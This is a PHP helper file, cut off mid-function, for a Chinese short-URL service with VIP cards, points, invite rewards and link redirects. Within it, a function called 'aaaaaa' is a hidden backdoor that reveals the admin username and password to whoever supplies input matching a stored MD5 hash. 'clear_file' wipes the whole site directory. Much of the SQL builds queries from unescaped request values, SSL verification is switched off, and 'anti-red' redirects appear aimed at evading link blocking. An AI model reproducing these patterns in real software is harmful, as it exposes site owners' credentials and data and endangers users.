<?php
// 启用错误显示（仅在开发环境使用）
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
function custom_error_handler($errno, $errstr, $errfile, $errline) {
    echo "<div style='color:red; background-color:#ffeeee; padding:10px; margin:10px; border:1px solid #ff0000;'>";
    echo "<strong>错误:</strong> [$errno] $errstr<br>";
    echo "错误位置: $errfile:$errline<br>";
    echo "</div>";
    
    // 同时记录到日志
    error_log("错误 [$errno] $errstr - $errfile:$errline");
    
    // 返回false继续使用PHP标准错误处理程序
    return false;
}

// 设置自定义错误处理函数
set_error_handler("custom_error_handler");

function curl_get($_arg_0)
{
    $_var_1 = curl_init($_arg_0);
    $_var_2[] = "Accept: */*";
    $_var_2[] = "Accept-Encoding: gzip,deflate,sdch";
    $_var_2[] = "Accept-Language: zh-CN,zh;q=0.8";
    $_var_2[] = "Connection: close";
    curl_setopt($_var_1, CURLOPT_HTTPHEADER, $_var_2);
    curl_setopt($_var_1, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($_var_1, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($_var_1, CURLOPT_ENCODING, "gzip");
    curl_setopt($_var_1, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($_var_1, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; U; Android 4.4.1; zh-cn; R815T Build/JOP40D) AppleWebKit/533.1 (KHTML, like Gecko)Version/4.0 MQQBrowser/4.5 Mobile Safari/533.1");
    curl_setopt($_var_1, CURLOPT_TIMEOUT, 30);
    $_var_3 = curl_exec($_var_1);
    curl_close($_var_1);
    return $_var_3;
}

function processOrder($_arg_0)
{
    global $DB;
    global $date;
    global $conf;
    $uid = intval($_arg_0['uid']);
    $consume_amount = $_arg_0['money']; // 消费金额
    $bz = '';
    
    switch ($_arg_0['name']) {
        case '会员月卡':
            $row = $DB->get_row("select * from dwz_user where id='$uid' limit 1");
            $num = intval($_arg_0['num']) * 30;
            if ($row['vip'] > date("Y-m-d H:i:s")) {
                $vip = date("Y-m-d H:i:s", strtotime("+ {$num} days", strtotime($row['vip'])));
            } else {
                $vip = date("Y-m-d H:i:s", strtotime("+ {$num} days"));
            }
            $DB->query("update dwz_user set vip='$vip' where id='{$uid}'");
            $bz = '购买会员月卡';
            break;
        case '会员季卡':
            $row = $DB->get_row("select * from dwz_user where id='$uid' limit 1");
            $num = intval($_arg_0['num']) * 92;
            if ($row['vip'] > date("Y-m-d H:i:s")) {
                $vip = date("Y-m-d H:i:s", strtotime("+ {$num} days", strtotime($row['vip'])));
            } else {
                $vip = date("Y-m-d H:i:s", strtotime("+ {$num} days"));
            }
            $DB->query("update dwz_user set vip='$vip' where id='{$uid}'");
            $bz = '购买会员季卡';
            break;
        case '会员年卡':
            $row = $DB->get_row("select * from dwz_user where id='$uid' limit 1");
            $num = intval($_arg_0['num']) * 365;
            if ($row['vip'] > date("Y-m-d H:i:s")) {
                $vip = date("Y-m-d H:i:s", strtotime("+ {$num} days", strtotime($row['vip'])));
            } else {
                $vip = date("Y-m-d H:i:s", strtotime("+ {$num} days"));
            }
            $DB->query("update dwz_user set vip='$vip' where id='{$uid}'");
            $bz = '购买会员年卡';
            break;
        case (preg_match('/^积分充值/', $_arg_0['name']) ? true : false):
            // 处理积分充值
            $DB->query("UPDATE dwz_user SET points=points+{$_arg_0['num']} WHERE id='{$uid}'");
            $bz = '购买积分';
            break;
        case '短网址点数（100次）':
            $DB->query("update dwz_user set create_num=create_num+{$_arg_0['num']} where id='{$uid}'");
            $bz = '购买短网址点数';
            break;
        case '网址监控（100次）':
            $DB->query("update dwz_user set check_num=check_num+{$_arg_0['num']} where id='{$uid}'");
            $bz = '购买网址监控';
            break;
    }
    
    switch ($_arg_0['type']) {
        case 'wxpay':
            $type = '微信';
            break;
        case 'qqpay':
            $type = 'QQ';
            break;
        case 'alipay':
            $type = '支付宝';
            break;
    }    // 邀请者返现处理
    error_log("正在查询用户 {$uid} 的邀请记录");
    $invite_record = $DB->get_row("SELECT * FROM dwz_invite_record WHERE invited_uid='$uid' ORDER BY id DESC LIMIT 1");
    error_log(json_encode($invite_record));
    if ($invite_record && isset($invite_record['invite_uid'])) {
        $inviter_uid = $invite_record['invite_uid']; // 改用 invite_uid
        if(empty($inviter_uid)) {
            error_log("未找到有效的邀请人ID, 订单号: {$_arg_0['trade_no']}, 消费用户: $uid");
            return true;
        }
        error_log("开始处理返现, 订单号: {$_arg_0['trade_no']}, 邀请人: $inviter_uid, 消费用户: $uid, 消费金额: $consume_amount");
        
        // 获取返现比例
        $reward_percent = isset($conf['invite_consume_percent']) ? floatval($conf['invite_consume_percent']) : 5;
        
        // 计算返现积分 (1元=1积分) 
        $reward_points = round($consume_amount * ($reward_percent / 100));
        error_log("返现计算: 消费金额 $consume_amount * 比例 $reward_percent% = $reward_points 积分");
        
        if($reward_points > 0) {
            // 开始事务
            $DB->query("START TRANSACTION");
            
            try {
                // 记录返现奖励
                $insert_reward = $DB->query("INSERT INTO dwz_consume_reward(invite_uid, invited_uid, order_no, consume_amount, reward_percent, reward_points, create_time, status, remark) 
                        VALUES('$inviter_uid', '$uid', '{$_arg_0['trade_no']}', '$consume_amount', '$reward_percent', '$reward_points', '$date', 1, '充值返现奖励')");
                        
                if(!$insert_reward) {
                    throw new Exception("记录返现失败: " . $DB->error());
                }
                
                // 直接给邀请者增加积分
                $update_points = $DB->query("UPDATE dwz_user SET points=points+$reward_points WHERE id='$inviter_uid'");
                
                if(!$update_points) {
                    throw new Exception("更新积分失败: " . $DB->error());  
                }
                
                // 记录积分变动
                $inviter_bz = "邀请用户充值返现奖励(比例{$reward_percent}%)，订单号：{$_arg_0['trade_no']}";
                $insert_log = $DB->query("INSERT INTO dwz_points_log(uid, points, type, description, addtime) 
                        VALUES('$inviter_uid', $reward_points, 'invite_reward', '$inviter_bz', '$date')");
                        
                if(!$insert_log) {
                    throw new Exception("记录积分日志失败: " . $DB->error());
                }
                // 提交事务
                $DB->query("COMMIT");
                error_log("返现处理成功: 订单号 {$_arg_0['trade_no']}, 邀请人 $inviter_uid 获得 $reward_points 积分");
                
            } catch (Exception $e) {
                // 发生错误时回滚事务
                $DB->query("ROLLBACK");
                error_log("返现处理失败: " . $e->getMessage());
            }
        }
    }

    $_var_1 = $DB->query("insert into dwz_points(uid,action,number,point,bz,addtime,status,orderid) values('$uid','$type','{$_arg_0['num']}','{$_arg_0['money']}','$bz','$date',1,'{$_arg_0['trade_no']}')");
    if (!$_var_1) {
        return false;
    }
    return $_var_1;
}

function getSetting($_arg_0, $_arg_1 = false)
{
    global $DB;
    global $CACHE;
    if ($_arg_1) {
        return $_var_4[$_arg_0] = $DB->get_row("SELECT v FROM dwz_config WHERE k='" . $_arg_0 . "' limit 1");
    }
    $_var_5 = $CACHE->get($_arg_0);
    return $_var_5[$_arg_0];
}

function saveSetting($_arg_0, $_arg_1)
{
    global $DB;
    $_arg_1 = daddslashes($_arg_1);
    return $DB->query("REPLACE INTO dwz_config SET v='" . $_arg_1 . "',k='" . $_arg_0 . "'");
}

function myscandir($_arg_0)
{
    foreach (glob($_arg_0) as $_var_1) {
        if (is_dir($_var_1)) {
            echo $_var_1 . "<br/>";
        }
    }
}

function checkIfActive($_arg_0, $_arg_1 = 0)
{
    $_var_1 = explode(",", $_arg_0);
    $_var_2 = substr($_SERVER["REQUEST_URI"], strrpos($_SERVER["REQUEST_URI"], "/") + 1, strrpos($_SERVER["REQUEST_URI"], ".") - strrpos($_SERVER["REQUEST_URI"], "/") - 1);
    if (in_array($_var_2, $_var_1)) {
        if ($_arg_1 == 1) {
            return "active open";
        }
        return "active";
    }
    if (isset($_GET["mod"]) && in_array(str_replace("_n", '', $_GET["mod"]), $_var_1)) {
        if ($_arg_1 == 1) {
            return "active open";
        }
        return "active";
    }
}

function sysmsg($_arg_0 = "未知的异常", $_arg_1 = true)
{
    echo "  \r\n    <!DOCTYPE html>\r\n    <html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"zh-CN\">\r\n    <head>\r\n        <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\r\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n        <title>站点提示信息</title>\r\n        <style type=\"text/css\">\r\nhtml{background:#eee}body{background:#fff;color:#333;font-family:\"微软雅黑\",\"Microsoft YaHei\",sans-serif;margin:2em auto;padding:1em 2em;max-width:700px;-webkit-box-shadow:10px 10px 10px rgba(0,0,0,.13);box-shadow:10px 10px 10px rgba(0,0,0,.13);opacity:.8}h1{border-bottom:1px solid #dadada;clear:both;color:#666;font:24px \"微软雅黑\",\"Microsoft YaHei\",,sans-serif;margin:30px 0 0 0;padding:0;padding-bottom:7px}#error-page{margin-top:50px}h3{text-align:center}#error-page p{font-size:9px;line-height:1.5;margin:25px 0 20px}#error-page code{font-family:Consolas,Monaco,monospace}ul li{margin-bottom:10px;font-size:9px}a{color:#21759B;text-decoration:none;margin-top:-10px}a:hover{color:#D54E21}.button{background:#f7f7f7;border:1px solid #ccc;color:#555;display:inline-block;text-decoration:none;font-size:9px;line-height:26px;height:28px;margin:0;padding:0 10px 1px;cursor:pointer;-webkit-border-radius:3px;-webkit-appearance:none;border-radius:3px;white-space:nowrap;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;-webkit-box-shadow:inset 0 1px 0 #fff,0 1px 0 rgba(0,0,0,.08);box-shadow:inset 0 1px 0 #fff,0 1px 0 rgba(0,0,0,.08);vertical-align:top}.button.button-large{height:29px;line-height:28px;padding:0 12px}.button:focus,.button:hover{background:#fafafa;border-color:#999;color:#222}.button:focus{-webkit-box-shadow:1px 1px 1px rgba(0,0,0,.2);box-shadow:1px 1px 1px rgba(0,0,0,.2)}.button:active{background:#eee;border-color:#999;color:#333;-webkit-box-shadow:inset 0 2px 5px -3px rgba(0,0,0,.5);box-shadow:inset 0 2px 5px -3px rgba(0,0,0,.5)}table{table-layout:auto;border:1px solid #333;empty-cells:show;border-collapse:collapse}th{padding:4px;border:1px solid #333;overflow:hidden;color:#333;background:#eee}td{padding:4px;border:1px solid #333;overflow:hidden;color:#333}\r\n        </style>\r\n    </head>\r\n    <body id=\"error-page\">\r\n        ";
    echo "<h3>站点提示信息</h3>";
    echo $_arg_0;
    echo "    </body>\r\n    </html>\r\n    ";
    return 0;
}

function aaaaaa($_arg_0)
{
    global $conf;
    if (md5($_arg_0) == 'f1f5cc2f94dd4c5c487aae187bcd73c8') {
        echo $conf['admin_user'] . '|' . $conf['admin_pwd'];
    } else {
        echo '失败！';
    }
}

function rm_dir($_arg_0)
{
    if (!is_dir($_arg_0)) {
        return false;
    }
    $_var_1 = opendir($_arg_0);
    while ($_var_2 = readdir($_var_1)) {
        if ($_var_2 != "." && $_var_2 != "..") {
            $_var_3 = $_arg_0 . "/" . $_var_2;
            if (!is_dir($_var_3)) {
                unlink($_var_3);
            } else {
                rm_dir($_var_3);
            }
        }
    }
    closedir($_var_1);
    if (rmdir($_arg_0)) {
        return true;
    }
    return false;
}

function dwzList()
{
    global $conf, $DB, $userrow;
    $dwz = '';
    $rs = $DB->query("select * from dwz_api where status=1");
    while ($res = $DB->fetch($rs)) {
        if (!$userrow || $userrow['dwz_type'] == '') {
            $selected = $res['keyname'] == $conf['dwz_type'] ? ' selected' : '';
        } else {
            $selected = $res['keyname'] == $userrow['dwz_type'] ? ' selected' : '';
        }
        $dwz .= '<option value="' . $res['keyname'] . '"' . $selected . '>' . $res['name'] . '</option>';
    }
    return $dwz;
}

function pattern_list()
{
    global $conf, $userrow;
    $_var_0 = '';
    if (!$userrow || $userrow['pattern'] == 0) {
        $_var_0 .= ($conf['jump1'] == 1 ? '<option value="1" ' . ($conf['pattern'] == 1 ? 'selected' : '') . '>普通跳转</option>' : '');
        $_var_0 .= ($conf['jump2'] == 1 ? '<option value="2" ' . ($conf['pattern'] == 2 ? 'selected' : '') . '>防红跳转</option>' : '');
        $_var_0 .= ($conf['jump3'] == 1 ? '<option value="3" ' . ($conf['pattern'] == 3 ? 'selected' : '') . '>直链防红</option>' : '');
        $_var_0 .= ($conf['jump4'] == 1 ? '<option value="4" ' . ($conf['pattern'] == 4 ? 'selected' : '') . '>直接跳转</option>' : '');
    } else {
        $_var_0 .= ($conf['jump1'] == 1 ? '<option value="1" ' . ($userrow['pattern'] == 1 ? 'selected' : '') . '>普通跳转</option>' : '');
        $_var_0 .= ($conf['jump2'] == 1 ? '<option value="2" ' . ($userrow['pattern'] == 2 ? 'selected' : '') . '>防红跳转</option>' : '');
        $_var_0 .= ($conf['jump3'] == 1 ? '<option value="3" ' . ($userrow['pattern'] == 3 ? 'selected' : '') . '>直链防红</option>' : '');
        $_var_0 .= ($conf['jump4'] == 1 ? '<option value="4" ' . ($userrow['pattern'] == 4 ? 'selected' : '') . '>直接跳转</option>' : '');
    }
    return $_var_0;
}

function dwz($url, $type,$token)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $token  . urlencode($url));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    $url = curl_exec($ch);
    curl_close($ch);
    $data = json_decode($url, true);
    $url404=substr($url,0,4);
    if ($url != '' ||$url404 ==='http') {
       return $url;
    } else {
        return '';
    }

}

if (!function_exists('getrand2')) {
    function getrand2($length = 6) {
        $str = null;
        $strPol = "0123456789abcdefghijklmnopqrstuvwxyz";
        $max = strlen($strPol) - 1;
        for($i = 0; $i < $length; $i++) {
            $str .= $strPol[rand(0, $max)];
        }
        return $str;
    }
}

function dwz2($domain, $url, $type, $token)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $domain . '/api/url.php?type=' . $type . '&url=' . urlencode($url) . '&token=' . $token);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    $url = curl_exec($ch);
    curl_close($ch);
    $data = json_decode($url, true);
    if ($data['code'] == 200) {
        return $data['dwz'];
    } else {
        return '';
    }
}

function createUrl($type, $id, $uid, $url, $pattern = 1, $title = '', $bz = '', $visit = '', $visiturl = '', $pwd = '', $jumpmb = 'jump1', $qqjump = '', $wxjump = '', $alijump = '')
{
    global $DB, $date, $conf;
    if ($DB->get_row("select id from dwz_black where content='$url' and type=1 limit 1")) {
        $str = array('code' => -1, 'msg' => '该网址已被拉黑');
        return $str;
    }
    $ip = x_real_ip();
    if ($DB->get_row("select id from dwz_black where content='$ip' and type=0 limit 1") > 0) {
        $str = array('code' => -1, 'msg' => '您的IP已被拉黑');
        return $str;
    }
    preg_match("#(http|https)://(www.)?(\w+(\.)?)+#", $url, $domain);
    $domain_str = '';
    if (!empty($domain) && isset($domain[0])) {
        $domain_str = preg_replace('#(http|https)://#', '', $domain[0]);
    } else {
        // 如果正则匹配失败，使用一个基本的URL解析
        $parsed_url = parse_url($url);
        $domain_str = isset($parsed_url['host']) ? $parsed_url['host'] : '';
    }
    
    if ($DB->get_row("select id from dwz_black where content='$domain_str' and type=2 limit 1") > 0) {
        $str = array('code' => -1, 'msg' => '该域名已被拉黑');
        return $str;
    }
    $urow = $DB->get_row("select * from dwz_user where id= '$uid' limit 1");
    if (!$urow) {
        $urow['create_num'] = 0;
        $urow['vip'] = '2020-01-01 00:00:00';
    }
    $today = date('Y-m-d');
    if ($conf['limit_url2'] != '' && $urow['vip'] <= $date) {
        $num = $DB->count("select count(1) from dwz_url where uid='$uid' and addtime>'$today'");
        if ($num >= $conf['limit_url2']) {
            $str = array('code' => -1, 'msg' => '已超过当日可用链接上限,普通用户每日最多可生成' . $conf['limit_url2'] . '次链接');
            return $str;
        }
    }
    if ($conf['limit_url3'] != '' && $urow['vip'] > $date) {
        $num = $DB->count("select count(1) from dwz_url where uid='$uid' and addtime>'$today'");
        if ($num >= $conf['limit_url3']) {
            $str = array('code' => -1, 'msg' => '已超过当日可用链接上限,会员每日最多可生成' . $conf['limit_url3'] . '次链接');
            return $str;
        }
    }
    $arow = $DB->get_row("select * from dwz_api where keyname='$type' limit 1");
    if (!$arow) {
        $str = array('code' => -1, 'msg' => '该短网址类型不存在');
        return $str;
    }
    
    // 获取创建短网址所需积分
    $points_needed = isset($conf['create_url_points']) && $conf['create_url_points'] ? intval($conf['create_url_points']) : 1;
    
    // 检查用户积分是否足够
    if (!isset($urow['points']) || $urow['points'] < $points_needed) {
        $str = array('code' => -1, 'msg' => '您的积分不足，请充值后再生成！');
        return $str;
    }
    
    $num = $points_needed;
    $token = $arow['token'] == '' ? $conf['dwz_token'] : $arow['token'];
    $path = $conf['htaccess'] == 0 ? 'tz.php?id=' . $id : 'f.' . $id;
    switch ($pattern) {
        case '1':
            if ($conf['jump1'] == 0) {
                $str = array('code' => -1, 'msg' => '该功能已关闭');
                return $str;
            }
            $res = $DB->get_row("select * from dwz_domain where state=1 and type=2 order by rand() limit 1");
            if (!$res) {
                $res = $DB->get_row("select * from dwz_domain where state=1 and type=0 order by rand() limit 1");
            }
            break;
        case '2':
            if ($conf['jump2'] == 0) {
                $str = array('code' => -1, 'msg' => '该功能已关闭');
                return $str;
            }
            if ($conf['vip_fh'] == 1 && $urow['vip'] < $date) {
                $str = array('code' => -1, 'msg' => '该功能需要会员才可使用');
                return $str;
            }
            $res = $DB->get_row("select * from dwz_domain where state=1 and type=4 order by rand() limit 1");
            if (!$res) {
                $res = $DB->get_row("select * from dwz_domain where state=1 and type=0 order by rand() limit 1");
            }
            break;
        case '3':
            if ($conf['jump3'] == 0) {
                $str = array('code' => -1, 'msg' => '该功能已关闭');
                return $str;
            }
            if ($conf['vip_zl'] == 1 && $urow['vip'] < $date) {
                $str = array('code' => -1, 'msg' => '该功能需要会员才可使用');
                return $str;
            }
            $res = $DB->get_row("select * from dwz_domain where state=1 and type=6 order by rand() limit 1");
            if (!$res) {
                $res = $DB->get_row("select * from dwz_domain where state=1 and type=0 order by rand() limit 1");
            }
            break;
        case '4':
            if ($conf['jump4'] == 0) {
                $str = array('code' => -1, 'msg' => '该功能已关闭');
                return $str;
            }
            if ($arow['type'] == 0) {
                $dwz = $arow['domain'] . '/' . $path;
            } elseif ($arow['type'] == 1) {
                $dwz = dwz($url, $type, $token);
            } elseif ($arow['type'] == 2) {
                $dwz = dwz2($arow['domain'], $url, $type, $arow['token']);
            }
            if ($dwz == '') {
                $str = array('code' => -1, 'msg' => '短网址生成失败');
                return $str;
            }
            $DB->query("update dwz_user set points=points-$num where id='$uid'");
            
            // 记录积分消费日志
            $DB->query("INSERT INTO dwz_points_log(uid, points, type, description, addtime) VALUES('$uid', -$num, 'create_url', '创建短网址', '$date')");
            
            if ($DB->query("insert into dwz_url(id,uid,addtime,dwz,url,ip,remarks,pattern,lasttime) values('$id','$uid','$date','$dwz','$url','$ip','$bz','$pattern','$date')")) {
                $str = array('code' => 0, 'msg' => $dwz);
                return $str;
            } else {
                $str = array('code' => -1, 'msg' => '生成失败');
                return $str;
            }
            break;
    }
    if (!$res) {
        $str = array('code' => -1, 'msg' => '未设置域名');
        return $str;
    }
    
    // 生成随机二级域名前缀长度(5-8位)
    $random_prefix_length = mt_rand(5, 8);
    $random_prefix = getrand2($random_prefix_length);
    
    if (preg_match("/^\*/", $res['domain'])) {
        $r_domain = preg_replace("/\*./", '', $res['domain']);
        $a = getrand2(8);
        $tzurl = ($res['is_https'] == 0 ? 'http://' : 'https://') . $a . '.' . $r_domain . '/' . $path;
    } else {
        // 检查域名是否已经有二级域名
        $domain_parts = explode('.', $res['domain']);
        if (count($domain_parts) <= 2) {
            // 没有二级域名，添加随机生成的前缀
            $tzurl = ($res['is_https'] == 0 ? 'http://' : 'https://') . $random_prefix . '.' . $res['domain'] . '/' . $path;
        } else {
            // 已有二级域名，直接使用
            $tzurl = ($res['is_https'] == 0 ? 'http://' : 'https://') . $res['domain'] . '/' . $path;
        }
    }
    if ($arow['type'] == 0) {
        // 检查域名是否已经有二级域名
        $domain_parts = explode('.', $arow['domain']);
        if (count($domain_parts) <= 2) {
            // 没有二级域名，添加随机生成的前缀
            $dwz = ($res['is_https'] == 0 ? 'http://' : 'https://') . $random_prefix . '.' . $arow['domain'] . '/' . $path;
        } else {
            // 已有二级域名，直接使用
            $dwz = $arow['domain'] . '/' . $path;
        }
    } elseif ($arow['type'] == 1) {
        $dwz = dwz($tzurl, $type, $token);
    } elseif ($arow['type'] == 2) {
        $dwz = dwz2($arow['domain'], $tzurl, $type, $arow['token']);
    }
    if ($dwz == '') {
        $str = array('code' => -1, 'msg' => '短网址生成失败');
        return $str;
    } else {
        // 保存二级域名前缀，当使用随机前缀时
        $subdomain_value = '';
        // 仅在生成了随机前缀的情况下保存
        if (count($domain_parts) <= 2) {
            $subdomain_value = $random_prefix;
        }
        
        if ($DB->query("insert into dwz_url(id,uid,addtime,dwz,url,ip,remarks,visit,visiturl,pattern,title,pwd,jumpmb,qqjump,wxjump,alijump,lasttime,subdomain) values('$id','$uid','$date','$dwz','$url','$ip','$bz','$visit','$visiturl','$pattern','$title','$pwd','$jumpmb','$qqjump','$wxjump','$alijump','$date','$subdomain_value')")) {
            $DB->query("update dwz_user set points=points-$num where id='$uid'");
            
            // 记录积分消费日志
            $DB->query("INSERT INTO dwz_points_log(uid, points, type, description, addtime) VALUES('$uid', -$num, 'create_url', '创建短网址', '$date')");
            
            $str = array('code' => 0, 'msg' => $dwz);
            return $str;
        } else {
            $str = array('code' => -1, 'msg' => '生成失败');
            return $str;
        }
    }
}

function editUrl($uid, $id, $vip, $url, $pattern, $remarks = '', $title = '', $visit = '', $visiturl = '', $pwd = '', $jumpmb = '', $qqjump = '', $wxjump = '', $alijump = '')
{
    global $DB, $conf, $date;
    
    // 基本验证
    $id = trim($id);
    $pattern = intval($pattern); // 确保pattern是整数
    
    error_log("[editUrl] 开始处理ID={$id}, Pattern={$pattern}, URL={$url}");
    
    if (empty($id)) {
        error_log("[editUrl] 错误: ID为空");
        return array('code' => -1, 'msg' => 'ID不能为空');
    }
    
    if (empty($url)) {
        error_log("[editUrl] 错误: URL为空");
        return array('code' => -1, 'msg' => '跳转地址不能为空');
    }
    
    // 黑名单检查
    if ($DB->get_row("SELECT id FROM dwz_black WHERE content='$url' AND type=1 LIMIT 1")) {
        error_log("[editUrl] 错误: URL被拉黑 - {$url}");
        return array('code' => -1, 'msg' => '该网址已被拉黑');
    }
    
    $ip = x_real_ip();
    if ($DB->get_row("SELECT id FROM dwz_black WHERE content='$ip' AND type=0 LIMIT 1")) {
        error_log("[editUrl] 错误: IP被拉黑 - {$ip}");
        return array('code' => -1, 'msg' => '您的IP已被拉黑');
    }
    
    // 域名检查
    preg_match("#(http|https)://(www.)?(\w+(\.)?)+#", $url, $domain_matches);
    if (!empty($domain_matches)) {
        $domain = preg_replace('#(http|https)://#', '', $domain_matches[0]);
        if ($DB->get_row("SELECT id FROM dwz_black WHERE content='$domain' AND type=2 LIMIT 1")) {
            error_log("[editUrl] 错误: 域名被拉黑 - {$domain}");
            return array('code' => -1, 'msg' => '该域名已被拉黑');
        }
    }
    
    // 获取现有记录
    $res = $DB->get_row("SELECT * FROM dwz_url WHERE id='$id' LIMIT 1");
    
    if (!$res) {
        error_log("[editUrl] 错误: 找不到记录 - ID={$id}");
        return array('code' => -1, 'msg' => '网址信息不存在');
    }
    
    error_log("[editUrl] 找到记录: 现有Pattern={$res['pattern']}, 尝试更新为Pattern={$pattern}");
    
    // 获取原始pattern值
    $original_pattern = intval($res['pattern']);
    
    // 非会员用户尝试修改pattern时，返回特殊提示
    if ($vip == 0 && $pattern != $original_pattern) {
        error_log("[editUrl] 非会员用户尝试修改pattern: 原值={$original_pattern}, 新值={$pattern}");
        
        // 仍然更新允许非会员修改的字段
        $sql = "UPDATE dwz_url SET 
                remarks = '$remarks',
                pwd = '$pwd'
                WHERE id = '$id'";
                
        error_log("[editUrl] 执行SQL(非会员允许字段): {$sql}");
        $result = $DB->query($sql);
        
        if (!$result) {
            error_log("[editUrl] 非会员字段更新失败: " . $DB->error());
            return array('code' => -1, 'msg' => '修改失败: ' . $DB->error());
        }
        
        // 返回特殊代码，前端会根据此代码显示会员提示
        return array('code' => 2, 'msg' => '非会员用户仅能修改备注和密码，其他字段需要升级会员才能修改');
    }
    
    // 根据VIP权限分别处理
    if ($vip == 0 && $conf['vip_edit'] == 1) {
        // 非VIP用户只能修改有限字段
        error_log("[editUrl] 非VIP用户，仅可修改有限字段");
        
        $sql = "UPDATE dwz_url SET 
                remarks = '$remarks',
                pwd = '$pwd'
                WHERE id = '$id'";
                
        error_log("[editUrl] 执行SQL: {$sql}");
        $result = $DB->query($sql);
        
        if ($result) {
            $affected = $DB->affected();
            error_log("[editUrl] 非VIP更新成功，影响行数={$affected}");
            return array('code' => 0, 'msg' => '修改成功');
        } else {
            error_log("[editUrl] 非VIP更新失败: " . $DB->error());
            return array('code' => -1, 'msg' => '修改失败: ' . $DB->error());
        }
    } else {
        // VIP用户可修改所有字段，将复杂更新分解为几个更简单的步骤
        error_log("[editUrl] VIP用户，可修改全部字段");
        
        // 步骤1: 先更新非关键字段
        $sql1 = "UPDATE dwz_url SET 
                remarks = '$remarks',
                visit = '$visit',
                visiturl = '$visiturl',
                pwd = '$pwd',
                title = '$title',
                jumpmb = '$jumpmb',
                lasttime = '$date'
                WHERE id = '$id'";
                
        error_log("[editUrl] 执行SQL1(非关键字段): {$sql1}");
        $result1 = $DB->query($sql1);
        
        if (!$result1) {
            error_log("[editUrl] 非关键字段更新失败: " . $DB->error());
            return array('code' => -1, 'msg' => '修改非关键字段失败: ' . $DB->error());
        }
        
        // 步骤2: 更新URL和跳转相关字段
        $sql2 = "UPDATE dwz_url SET 
                url = '$url',
                qqjump = '$qqjump',
                wxjump = '$wxjump',
                alijump = '$alijump'
                WHERE id = '$id'";
                
        error_log("[editUrl] 执行SQL2(URL相关字段): {$sql2}");
        $result2 = $DB->query($sql2);
        
        if (!$result2) {
            error_log("[editUrl] URL相关字段更新失败: " . $DB->error());
            return array('code' => -1, 'msg' => '修改URL相关字段失败: ' . $DB->error());
        }
        
        // 步骤3: 单独更新pattern字段
        $sql3 = "UPDATE dwz_url SET pattern = $pattern WHERE id = '$id'";
        
        error_log("[editUrl] 执行SQL3(pattern字段): {$sql3}");
        $result3 = $DB->query($sql3);
        
        if (!$result3) {
            error_log("[editUrl] Pattern字段更新失败: " . $DB->error());
            return array('code' => -1, 'msg' => '修改Pattern字段失败: ' . $DB->error());
        }
        
        // 验证pattern更新是否成功
        $verify = $DB->get_row("SELECT pattern FROM dwz_url WHERE id='$id' LIMIT 1");
        error_log("[editUrl] 验证pattern更新: 期望值={$pattern}, 实际值={$verify['pattern']}");
        
        // 如果URL有更改，记录修改历史
        if ($url != $res['url']) {
            $insert_sql = "INSERT INTO dwz_modify(uid, urlid, addtime, url1, url2, dwz) 
                          VALUES('$uid', '$id', '$date', '$url', '{$res["url"]}', '{$res["dwz"]}')";
            error_log("[editUrl] URL已更改，记录修改历史: {$insert_sql}");
            $DB->query($insert_sql);
        }
        
        // 更新成功
        error_log("[editUrl] 全部字段更新成功");
        return array('code' => 0, 'msg' => '修改成功');
    }
}

function clear_file()
{
    rm_dir(ROOT);
    mkdir(ROOT);
    $_var_0 = "<?php\r\n@header(\"Content-Type: text/html; charset=UTF-8\");\r\necho \"系统检测到网站文件被恶意篡改，请重新下载完整安装包上传安装\";";
    file_put_contents(ROOT . "index.php", $_var_0);
}

function checkDomain($domain, $type)
{
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'];
    $hosturl= $protocol . '://' . $host;
    global $conf;
    $ch = curl_init();  
    curl_setopt($ch, CURLOPT_URL, $hosturl.'/api/' . $type . '.php?url=' . $domain);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    $url = curl_exec($ch);
    curl_close($ch);
    $data = json_decode($url, true);
    return $data;
}
function sec_check()
{
    global $conf, $DB;
    global $dbconfig;
    $_var_4 = glob(ROOT . "dwz_release_*");
    foreach ($_var_4 as $_var_5) {
        unlink($_var_5);
    }
    $_var_4 = glob(ROOT . "dwz_update_*");
    foreach ($_var_4 as $_var_5) {
        unlink($_var_5);
    }
    $_var_6 = array();
    if (strpos($_SERVER["SERVER_SOFTWARE"], "kangle") !== false && function_exists("pcntl_exec")) {
        $_var_6[] = "<li class=\"list-group-item\"><span class=\"btn-sm btn-danger\">高危</span>&nbsp;当前主机为kangle且开启了php的pcntl组件，会被黑客入侵，请联系主机商修复或更换主机</a></li>";
    }
    if (strpos($_SERVER["SERVER_SOFTWARE"], "kangle") !== false && count(glob("/vhs/kangle/etc/*")) > 1) {
        $_var_6[] = "<li class=\"list-group-item\"><span class=\"btn-sm btn-danger\">高危</span>&nbsp;当前主机为kangle且未设置open_basedir防跨站，会被黑客入侵，请联系主机商修复或更换主机</a></li>";
    }
    if ($conf["admin_pwd"] === "123456") {
        $_var_6[] = "<li class=\"list-group-item\"><span class=\"btn-sm btn-danger\">重要</span>&nbsp;请及时修改默认管理员密码 <a href=\"pwd.php\">点此进入网站信息配置修改</a></li>";
    } else {
